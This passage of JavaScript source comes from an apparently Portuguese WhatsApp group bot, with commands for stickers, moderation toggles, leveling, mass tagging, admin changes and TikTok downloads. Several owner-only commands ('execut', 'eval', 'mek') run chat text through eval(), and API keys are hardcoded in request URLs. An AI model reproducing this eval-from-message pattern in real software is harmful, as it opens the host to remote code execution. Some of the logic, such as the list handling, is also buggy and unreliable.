const desenhoi = `${Math.floor(Math.random() * 102)}`
const desenhoo = `${Math.floor(Math.random() * 102)}`

 popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-desenho/${desenhoa}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-desenho/${desenhoe}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-desenho/${desenhoi}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-desenho/${desenhoo}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ nezuko.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `© _Copyright by NEZUKO-MD_`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '『🦄 Mais Figurinhas 💜』'}, type: 1}]}, {quoted: dnselo}) }, 2090)
break

case 'fig-emoji':
const emojii = `${Math.floor(Math.random() * 40)}`
const eemoji = `${Math.floor(Math.random() * 40)}`
const emojis = `${Math.floor(Math.random() * 40)}`
const emojiu = `${Math.floor(Math.random() * 102)}`

 popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-emoji/${emojii}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-emoji/${eemoji}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-emoji/${emojis}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-emoji/${emojiu}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ nezuko.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `© _Copyright by NEZUKO-MD_`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '『🦄 Mais Figurinhas 💜』'}, type: 1}]}, {quoted: dnselo}) }, 2090)
break

case 'figuanime':
case 'fig-anime':
case 'fig-animes':
const annime = `${Math.floor(Math.random() * 77)}`
const annnime = `${Math.floor(Math.random() * 77)}`
const annnnime = `${Math.floor(Math.random() * 77)}`
const nnnannime = `${Math.floor(Math.random() * 77)}`

 popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-anime/${annime}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-anime/${annnime}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-anime/${annnnime}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-anime/${nnnannime}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })
setTimeout(() =>{ nezuko.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `© _Copyright by NEZUKO-MD_`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '『🦄 Mais Figurinhas 💜』'}, type: 1}]}, {quoted: dnselo}) }, 2090)
break

case 'figuraiva':
case 'fig-raiva':
case 'figraiva':
const raivaa = `${Math.floor(Math.random() * 29)}`
const raivae = `${Math.floor(Math.random() * 29)}`
const raivai = `${Math.floor(Math.random() * 29)}`
const raivao = `${Math.floor(Math.random() * 29)}`

 popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-raiva/${raivaa}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-raiva/${raivae}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-raiva/${raivai}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-raiva/${raivao}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ nezuko.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `© _Copyright by NEZUKO-MD_`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '『🦄 Mais Figurinhas 💜』'}, type: 1}]}, {quoted: dnselo}) }, 2090)
break

case 'figubb':
case 'fig-coreana':
const bba = `${Math.floor(Math.random() * 21)}`
const bbe = `${Math.floor(Math.random() * 21)}`
const bbi = `${Math.floor(Math.random() * 21)}`
const bbo = `${Math.floor(Math.random() * 21)}`

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-coreana/${bba}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-coreana/${bbe}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-coreana/${bbi}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-coreana/${bbo}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ nezuko.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `© _Copyright by NEZUKO-MD_`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '『🦄 Mais Figurinhas 💜』'}, type: 1}]}, {quoted: dnselo}) }, 2090)
break

case 'figuengracado':
case 'fig-engracada':
case 'fig-engraçada':
const engraa = `${Math.floor(Math.random() * 25)}`
const engrae = `${Math.floor(Math.random() * 25)}`
const engrai = `${Math.floor(Math.random() * 25)}`
const engrao = `${Math.floor(Math.random() * 25)}`

 popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-engracadas/${engraa}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-engracadas/${engrae}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-engracadas/${engrai}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

popopoc = fs.readFileSync(`./FIGURINHAS/figurinha-engracadas/${engrao}.webp`)
nezuko.sendMessage(from, { sticker: popopoc })

setTimeout(() =>{ nezuko.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `© _Copyright by NEZUKO-MD_`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '『🦄 Mais Figurinhas 💜』'}, type: 1}]}, {quoted: dnselo}) }, 2090)
break
//======================================\\
                

//novos
case 'validar-key':
if (!SoDono && info.key.fromMe) return reply(enviar.msg.donosmt)
reply(`Validando suas credenciais no site, aguarde!`)
anu = await fetchJson(`https://nezsab-apis.xyz/api/keyerrada?apikey=key-da-daniela-totosa`)
reply(`*Resposta do site:* ${anu.msg}`)
break
//========COMANDOS DE GRUPO=============

case 'status':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins && !SoDono  && !m.key.fromMe) return reply(enviar.msg.adm)
statuszada =
`╭╼╼╾❲ S T A T U S ❳╼╼╾╮
┃❖│
┃❖│➱ Antiaudio: ${isAntiAudio? '✓' : '✕'}
┃❖│➱ Antidocumento: ${Antidoc ? '✓' : '✕'}
┃❖│➱ Antifake: ${isAntifake ? '✓' : '✕'}
┃❖│➱ Antiimg: ${isAntiImg? '✓' : '✕'}
┃❖│➱ AntiContato ${isAntiCtt ? '✓' : '✕'}
┃❖│➱ AntiSticker: ${isAntiSticker ? '✓' : '✕'}
┃❖│➱ Antiligação: ${isAnticall ? '✓' : '✕'}
┃❖│➱ AntiPv-Block: ${isAntiPv ? '✓' : '✕'}
┃❖│➱ AntilinkHard: ${isAntiLinkHard ? '✓' : '✕'}
┃❖│➱ LimiteCaracteres: ${isAntiFlood ? '✓' : '✕'}
┃❖│➱ AntiCatalogo: ${isAnticatalogo ? '✓' : '✕'}
┃❖│➱ AntiPalavrão: ${isPalavrao ? '✓' : '✕'}
┃❖│➱ Antivideo: ${isAntiVid ? '✓' : '✕'}
┃❖│➱ AntiLocalização: ${Antiloc ? '✓' : '✕'}
┃❖│➱ Simih: ${isSimi ? '✓' : '✕'}
┃❖│
╰╼╾❲ ж☬ˢLᎾᏒᎠᎬ༻꧂ ❳╼╾╯`
wew = await getBuffer(`${logo29}`)
nezuko.sendMessage(from, {image: wew, caption: statuszada, thumbnail: null})
break

case 'leveling':
if (!isGroup) return reply('Só em Grupo')
if (!isGroupAdmins) return reply('Você precisa ser adm')
if (args.length < 1) return reply('Ative pressione 1, Desativar pressione 0')
if (Number(args[0]) === 1) {
if (isLevelingOn) return reply('*O recurso de nível já estava ativo antes*')
leveling.push(from)
fs.writeFileSync('./funções de cmd/usuarios/leveling.json', JSON.stringify(leveling))
reply(enviar.levelon) 
} else if (Number(args[0]) === 0) {
if (!isLevelingOn) return reply(`O recurso de level já está Desativado neste grupo.`)
leveling.splice(from, 1)
fs.writeFileSync('./funções de cmd/usuarios/leveling.json', JSON.stringify(leveling))
reply(enviar.leveloff)
} else {
reply('「* Adicionar parâmetro 1 ou 0 ')
}
break

case 'ganharlevel':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")
addLevelingLevel(sender, 5000)
reply("Olá chefe, foi adicionado 5000 mil Level para você 🙂")
break

case 'ganharxp':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")  
addLevelingXp(sender, 5000)
reply("Foi adicionado 5000 mil de XP para você 🙂")
break

case 'level':
if (!isLevelingOn) return reply(`*O recurso de level está Desativado, para ativar consulte algum adm e mande ele digitar : ${prefix}leveling 1`)
if (!isGroup) return reply(enviar.msg.grupo)
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
if (userLevel === undefined && userXp === undefined) return reply(enviar.levelnol)
sem = sender.replace('@s.whatsapp.net','')
resul = `     
╭━─━───[🌹️️]────━─━╮
              𝐑𝐄𝐆𝐈𝐒𝐓𝐑𝐎
╰━─━───[🌹️️]────━─━╯

├─ [👥️] 𝐮𝐬𝐮𝐚́𝐫𝐢𝐨: ${pushname}
├─ [🚀] 𝐧𝐮́𝐦𝐞𝐫𝐨 : ${sender.split("@")[0]}
├─ [🔱] 𝐩𝐚𝐭𝐞𝐧𝐭𝐞: ${patt} 
├─ [🗣️] 𝐱𝐩: ${userXp}
└─ [🏓] 𝐥𝐞𝐯𝐞𝐥: ${userLevel}`
await nezuko.sendMessage(from, {text: resul}, {quoted: dnselo})
.catch(async (err) => {
console.error(err)
await reply(`Error!\n${err}`)
})
break

case 'ranklevel':
case 'rl':
case 'rank':
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
let leaderboardlvl = '🏆《 Rank Niveis 》🏆\n\n'
let nom = 0
try {
for (let i = 0; i < 10; i++) {
nom++
leaderboardlvl += `
┏ ✘🌖 ${NomeDoBot} 🌘✘┓
┃•────•───────•───•
┣❲🏆❳ [${nom}] ϟ➠ ${_level[i].id.replace('@s.whatsapp.net', '')}
┣❲🏆❳「xp」: ϟ${_level[i].xp}
┣❲🏆❳「Level」 :ϟ➠ ${_level[i].level}
┗ ──────「★」──────┚\n`

}
leaderboardlvl += `×•-•-•⟮ 🏆Ranking Level🏆⟯•-•-•×`
nezuko.sendMessage(from, {text: leaderboardlvl, sendEphemeral: true}, {quoted: dnselo})
} catch (err) {
console.error(err)
await reply(`Deve conter 10 pessoas com level, e o leveling deve está ativado para que aconteça a evolução de level dos membros, após as interações`)
}
break

case 'linkgc':
case 'linkgroup':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
linkgc = await nezuko.groupInviteCode(from)
reply('https://chat.whatsapp.com/'+linkgc)
break

case 'modonsfw':
case 'nsfw':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isNsfw) return reply('O modo nsfw já está ativo')
nsfw.push(from)
fs.writeFileSync('./funções de cmd/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`✓Ativado com sucesso o modo nsfw +18 no grupo\`\`\` *${groupMetadata.subject}*`)
} else if (Number(args[0]) === 0) {
if (!isNsfw) return reply('O modo nsfw já está Desativado')  
nsfw.splice(from, 1)
fs.writeFileSync('./funções de cmd/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`✓Modo Nsfw +18 desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
reply('1 para ativar, 0 para desligar')
}
break 

case 'game':
case 'modobrincadeira':
if(!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
if(!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (!isGroup) return reply(mensagem[0].grupo);
if (Number(args[0]) === 1) {
if (isGame) return reply(`Modo ${command} já está habilitado!`);
game.push(from)
fs.writeFileSync('./funções de cmd/funções/game.json', JSON.stringify(game))
reply(`Modo *${command} habilitado* 🟢\n\nTodos os jogos foram liberados!`)
} else if (Number(args[0]) === 0) {
if (!isGame) return reply(`${command} já está desabilitado!`)
pesquisar = from
processo = game.indexOf(pesquisar)
while(processo >= 0){
game.splice(processo, 1)
processo = welkom.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/funções/game.json', JSON.stringify(welkom))
reply(`Modo *${command} desabilitado!* 🔴\n\nOs jogos foram bloqueados, para jogar é preciso que o ADM libere.`)
} else {
reply(`Use ${prefix + command} 1 para ligar ou ${prefix + command} 0 para desligar`)
}
break

case 'delete': case 'd': {
if (!quoted) return
let { chat, fromMe, id } = m.quoted
nezuko.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
reply(`MSG APAGADA!!`)
break

case 'listonline': case 'lista-online': {
if (!isGroup) return reply(mess.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
let liston = 1
nezuko.sendText(from, '     「 lista Online 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break

case 'msg': {
if (!SoDono) return reply(mess.owner)
if (!args.join(" ")) return reply(`Exemplo :\n${prefix + command} 21958xxxx|olá`)
const cpes = args.join(" ")
const nony = cpes.split("|")[0];
const pesny = cpes.split("|")[1];
lolh = `*| MSG DO MEU DONO |*

Mensagem do administrador de bots
Número : wa.me/${m.sender.split("@")[0]}
Mensagem : ${pesny}`
nezuko.sendMessage(nony + "@s.whatsapp.net", {text:lolh, mentions:[sender]}, {quoted:m})
}
await reply("Sucesso")
break

case 'criargp':
if (!SoDono) return reply('Este comando é somente pro meu criador')
const gp = args.join(' ')
if (!gp) return reply('*Escreva o nome do grupo que vc quer criar....*')
await nezuko.groupCreate(`${gp}`, [sender])
reply(`*Grupo criado com sucesso!*\n*Nome:* ${gp}`)
break

case 'tagall':
case 'marcar': {
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !SoDono) return reply(mess.admin)
 let metadata = await nezuko.groupMetadata(from)
let teks = `
〘 *👥 MARCANDO TODOS 👥* 〙
\n ${metadata.participants.length ? metadata.participants.length : "undefined"} participantes do grupo
\n ➲ *Mensagem : ${args.join(" ") ? args.join(" ") : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `┃❖│ @${mem.id.split('@')[0]}\n`
}
nezuko.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: dnselo})
}
break

case 'marcarwa':
try {
if (!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if (!isGroupAdmins && !SoDono) return reply('Você precisa ser ADM pra utilizar este comando')  
if(q.includes(`${prefix}`)) return reply("Não pode utilizar comandos nesse comando")
members_id = []
 let metadata = await nezuko.groupMetadata(from)
teks = (args.length > 1) ? body.slice(10).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `〘 *👥 MARCANDO TODOS 👥* 〙
\n ${metadata.participants.length ? metadata.participants.length : "undefined"} participantes do grupo
\n ╠➥ https://wa.me/${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
} catch {
reply('ERROR!!')
}
break

case 'cita':
case 'hidetag':
if(!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if (!isGroupAdmins && !SoDono) return reply('Você precisa ser ADM pra utilizar este comando')
membros = (groupId, membros1) => {
array = []
for (let i = 0; i < membros1.length; i++) {
array.push(membros1[i].id)
}
return array
}
var yd = membros(from, groupMembers)
if((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
media = isQuotedSticker ? m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage : m.message.stickerMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'sticker')
fs.writeFileSync(rane,img)
fig = fs.readFileSync(rane)
var options = {
sticker: fig,  
mentions: yd
}
nezuko.sendMessage(from, options)
} else if ((isMedia && !m.message.videoMessage || isQuotedImage) && args.length == 0) {
media = isQuotedImage ? m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : m.message.imageMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'image')
fs.writeFileSync(rane,img)
buff = fs.readFileSync(rane)
nezuko.sendMessage(from, {image: buff, mentions: yd}, {quoted: dnselo})
} else if ((isMedia && !m.message.videoMessage || isQuotedVideo) && args.length == 0) {
media = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
rane = getRandom('.'+await getExtension(media.mimetype))
vid = await getFileBuffer(media, 'video')
fs.writeFileSync(rane,vid)
buff = fs.readFileSync(rane)
nezuko.sendMessage(from, {video: buff, mimetype: 'video/mp4',mentions: yd}, {quoted: dnselo})
} else if ((isMedia && !m.message.videoMessage || isQuotedAudio) && args.length == 0) {
media = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
rane = getRandom('.'+await getExtension(media.mimetype))
aud = await getFileBuffer(media, 'audio')
fs.writeFileSync(rane,aud)
buff = fs.readFileSync(rane)
nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mp4', ptt:true,mentions: yd}, {quoted: dnselo})
} else if ((isMedia && !m.message.videoMessage || isQuotedDocument) && args.length == 0) {
media = isQuotedDocument ? m.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : m.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(rane,doc)
buff = fs.readFileSync(rane)
nezuko.sendMessage(from, {document: buff, mimetype : 'text/plain',mentions: yd},{quoted: dnselo})
} else if(body){
if(q.length < 1) return reply('Citar oq vey?')
nezuko.sendMessage(from, {text: body.slice(command.length + 2), mentions: yd})
} else {
reply(`Responder imagem/documento/gif/adesivo/áudio/vídeo com legenda ${prefix + command}`)
}
break

case 'aviso':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('Coloque seu aviso após o comando');
                let part = participantess(from, groupMembers)
                tag = `📢 *AVISO DO ADMINISTRADOR* 📢\n📍 @${sender.split('@')[0]}\n\n${body.slice(command.length + 2).toUpperCase()}\n\n${'='.repeat(20)}\n${'\u200B'.repeat(2000)}`
                for (let i = 0; i < part.length; i++) {
                    tag += `❧ @${part[i].split('@')[0]}\n`
                }
                options = {
                    text: tag,
                    mentions: part,
                    quoted: m
                }
                nezuko.sendMessage(from, options)
                break

case 'tagdivulga': {
                if (!isGroup) return reply(`SÓ EM GRUPO`)
                if (!isGroupAdmins) return reply(`PRECISA SER ADMINISTRADOR`)
                if (!isBotGroupAdmins) return reply(`BOT PREPRECISA SER ADMINISTRADOR`)
                let teks = `_⚠️atenção🛑_\n\n*Nós, administradores do grupo :\n${groupName}*\n\n${q ? q : 'em branco'}\n\n`
                for (let mem of participants) {
                    teks += `° @${mem.id.split('@')[0]}\n`
                }
                nezuko.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
            }
                break

case 'promover': 
case 'promote':
if(!isGroupAdmins && !SoDono) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque ou responda a mensagem de quem você quer promover')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
if (botNumber.includes(mentioned)) return reply("😑")
let responsedm = await nezuko.groupParticipantsUpdate(from, [mentioned], 'promote')
if (responsedm[0].status === "200") nezuko.sendMessage(from, {text: `@${mentioned.split("@")[0]} agora é um fiscal do bar.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responsedm[0].status === "404") nezuko.sendMessage(from, {text: `@${mentioned.split("@")[0]} não está no grupo️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else nezuko.sendMessage(from, {text: `Parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
break

case 'rebaixar':
case 'demote':
if(!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
if(!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque ou responda a mensagem de quem você quer tirar de admin')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
if (botNumber.includes(mentioned)) return reply("😑 marque outra pessoa")
if (botNumber.includes(mentioned)) return reply("😑")
let responsepm = await nezuko.groupParticipantsUpdate(from, [mentioned], 'demote')
if (responsepm[0].status === "406") nezuko.sendMessage(from, {text: `@${mentioned.split("@")[0]} criou esse grupo e não pode ser removido(a) da lista de admins.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responsepm[0].status === "200") nezuko.sendMessage(from, {text: `@${mentioned.split("@")[0]} perdeu seu cargo de fiscal do bar.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responsepm[0].status === "404") nezuko.sendMessage(from, {text: `@${mentioned.split("@")[0]} não está no grupo️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else nezuko.sendMessage(from, {text: `Parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
break

//======================================\\

case 'tiktok':
{
  if (!q) return reply('Cadê o link do vídeo?')
  reply(mess.wait)
let buttons = [
{buttonId: `${prefix}tiktok_audio ${q}`, buttonText: {displayText: '🎶 Baixar [ Formato: Áudio ]'}, type: 1}, 
{buttonId: `${prefix}tiktok_video ${q}`, buttonText: {displayText: '🎦 Baixar [ Formato: Vídeo ]'}, type: 1}, 
{buttonId: `${prefix}tiktok_doc ${q}`, buttonText: {displayText: '📄 Baixar [ Formato: Doc ]'}, type: 1}]
let thumbInfo = `⚠︎ 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘥𝘦 𝘔𝘪́𝘥𝘪𝘢⧽ *[ TIKTOK ]*\n• Escolha uma das opções desejada:`;
blabla = await getBuffer(`https://telegra.ph/file/edd91441c8182dc539df1.jpg`);
buttonMessage = {image: blabla, caption: `${thumbInfo}`, footer: `By: ${NomeDoBot}`, buttons: buttons, headerType: 4}
nezuko.sendMessage(from, buttonMessage, {quoted: dnselo})
}
break

case 'tiktok_audio': // @Vitinho 
nezuko.sendMessage(from, {react: {text: `✅`, key: info.key}})
anu = await fetchJson(`https://ayu.p7api.xyz/api/dl/tiktok?link=${q}&apikey=saladakk`)
reply('*⬇️ Baixando, aguarde um instante...*')
nezuko.sendMessage(from, { audio: { url: anu.resultado.audio }, mimetype: 'audio/mp4', fileName: `${anu.resultado.criador}.mp3`}, { quoted: dnselo })
break

case 'tiktok_video': // @Vitinho 
nezuko.sendMessage(from, {react: {text: `✅`, key: info.key}})
anu = await fetchJson(`https://ayu.p7api.xyz/api/dl/tiktok?link=${q}&apikey=saladakk`)
reply('*⬇️ Baixando, aguarde um instante...*')
nezuko.sendMessage(from, { video: { url: anu.resultado.videoSemWt }, mimetype: 'video/mp4', fileName: `${anu.resultado.criador}.mp4`}, { quoted: dnselo })
break

case'tiktok_doc': // @Vitinho 
nezuko.sendMessage(from, {react: {text: `✅`, key: info.key}})
anu = await fetchJson(`https://ayu.p7api.xyz/api/dl/tiktok?link=${q}&apikey=saladakk`)
reply('*⬇️ Baixando, aguarde um instante...*')
nezuko.sendMessage(from, { document: { url: anu.resultado.audio }, mimetype: 'audio/mp3', fileName: `${anu.resultado.criador}.mp3`}, { quoted: dnselo })
break

case 'facevideo':
case 'instavideo':
case 'tiktokvideo':
case 'twittervideo':
case 'youtubevideo':
try {
reply(mess.wait)
const {savefrom} = require('./lib/savefrom.js')
wew = await savefrom(q)
jet = {url: wew.url[0].url}
nezuko.sendMessage(from, {video: jet, mimetype: "video/mp4", caption: "Pronto!"}, {quoted: dnselo})
} catch {
reply('Não foi possível baixar este vídeo 😔')
}
break
//======================================\\

case 'reviverqr':
case 'sairdoaguarde':
case 'sairaguarde':
case 'reiniciar':
if(!SoDono) return 
try {
setTimeout(async () => {
reply("Aguarde estou Reiniciando...")
}, 0)
setTimeout(async () => {
const qrc = JSON.parse(fs.readFileSync('./qr-code.json'));
qrc.keys.preKeys = {}
qrc.keys.sessions = {}
qrc.keys.senderKeyMemory = {}
fs.writeFileSync('./qr-code.json', JSON.stringify(qrc, null, 2))
process.exit()
}, 1000)
} catch {
reply("Erro")
}
break

case 'add': 
case 'reviver':
if(!SoDono)return reply('Só meu Mestre')
     if (!isGroup) return reply('Comando apenas para grupo')
if(!isGroupAdmins) return reply(mess.only.admin)
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
     if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('informe quem devo adicionar no grupo novamente, marcado a mensagem da pessoa...')
     num = (`${body.slice(9)}`);
     if (num.length < 1){
     var mentioned = mek.message.extendedTextMessage.contextInfo.participant
     nezuko.groupParticipantsUpdate(from, [`${mentioned}`], 'add');
     } else {
     id = ([`${num.replace('@', '')}@s.whatsapp.net`])
     nezuko.groupParticipantsUpdate(from, id, 'add')
     }
     reply('*Adicionado Com Sucesso 👏🦆✅*')
     break

case 'sairgp':
if(isGroup && !SoDono && !m.key.fromMe) return reply("Este comando só o bot ou o dono pode executar..")
try {
nezuko.groupLeave(from)
} catch(erro) {
reply(String(erro))
}
break

case 'mek':
                if (!SoDono) return reply('So Meu Dono')
                reqfmek = "m.quoted"
                respostafmek = util.format(eval(`(async () => { return ${reqfmek} })()`))

                reply(respostafmek)
                break

case 'execut':
if(!SoDono) return reply('So Meu Dono')
try{
return eval(`(async() => { ${args.join(' ')}})()`)
}catch (e) {
reply(`${e}`)
}
break 

case 'eval':
if (!SoDono) return SoDonoCmd()
      try {
      eval(`(async () => {
          try {
           ${texto};
          } catch(err) {
           reply(String(err));
          }
        })();`);
      } catch(err) {
       reply(String(err));
     }
     break

case 'membros':
mem = `× 𝘘𝘶𝘢𝘯𝘵𝘪𝘥𝘢𝘥𝘦 𝘥𝘦 𝘈𝘥𝘮𝘪𝘯𝘴⧽ ${groupAdmins.length}\n× 𝘘𝘶𝘢𝘯𝘵𝘪𝘥𝘢𝘥𝘦 𝘥𝘦 𝘗𝘢𝘳𝘵𝘪𝘤𝘪𝘱𝘢𝘯𝘵𝘦𝘴⧽ ${participants.length}`
nezuko.sendMessage(from, {text: mem}, {quoted: dnselo})
break

case 'rankativo':
case 'rankativos':  
if (!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(mess.only.admin)
if(groupIdscount.indexOf(from) < 0) return reply('O bot não tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if(countMessage[ind].numbers.length < 3) return reply('Necessita do registro de 3 usuarios')
countMessage[ind].numbers.sort((a, b) => (a.messages < b.messages) ? 1 : -1)
mentioned_jid = []
boardi = '🗣 *Ranking dos membros mais ativos:*\n\n'
try {
for (let i = 0; i < 5; i++) {
if (i == 0) boardi += `*${i + 1}º 🥇:  @${countMessage[ind].numbers[i].id.split('@')[0]}*\n× Mensagens Enviadas⧽ ${countMessage[ind].numbers[i].messages}\n× Comandos Realizados⧽ ${countMessage[ind].numbers[i].cmd_messages}\n`
else if (i == 1) boardi += `*${i + 1}º 🥈: @${countMessage[ind].numbers[i].id.split('@')[0]}*\n× Mensagens Enviadas⧽ ${countMessage[ind].numbers[i].messages}\n× Comandos Realizados⧽ ${countMessage[ind].numbers[i].cmd_messages}\n`
else if (i == 2) boardi += `*${i + 1}º 🥉: @${countMessage[ind].numbers[i].id.split('@')[0]}*\n× Mensagens Enviadas⧽ ${countMessage[ind].numbers[i].messages}\n× Comandos Realizados⧽ ${countMessage[ind].numbers[i].cmd_messages}\n`
else if (i == 3) boardi += `*${i + 1}º 🥉: @${countMessage[ind].numbers[i].id.split('@')[0]}*\n× Mensagens Enviadas⧽ ${countMessage[ind].numbers[i].messages}\n× Comandos Realizados⧽ ${countMessage[ind].numbers[i].cmd_messages}\n`	
